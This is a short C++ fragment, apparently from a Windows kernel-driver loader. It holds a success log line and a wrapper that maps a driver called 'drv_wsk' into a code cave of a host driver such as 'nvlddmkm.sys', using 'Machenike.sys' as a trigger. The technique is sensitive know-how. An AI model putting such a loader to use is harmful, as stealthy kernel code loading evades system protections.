    LOG_OK("LoadDrvWsk: drv_wsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
           actualHostName, hostDrvSize);
    return true;
}

// 别名包装，明确 ManualMapCave 模式语义
static inline bool LoadDrvWskViaCave(
    const wchar_t*        drvWskPath,
    const wchar_t*        triggerDrvName       = L"Machenike.sys",
    const wchar_t*        preferredHostDrvName = L"nvlddmkm.sys",
    bool                  forceReload          = false,
    const DRV_BOOT_CONFIG* pBootConfig         = nullptr)
{
    return LoadDrvWsk(drvWskPath, triggerDrvName, preferredHostDrvName, forceReload, pBootConfig);
}
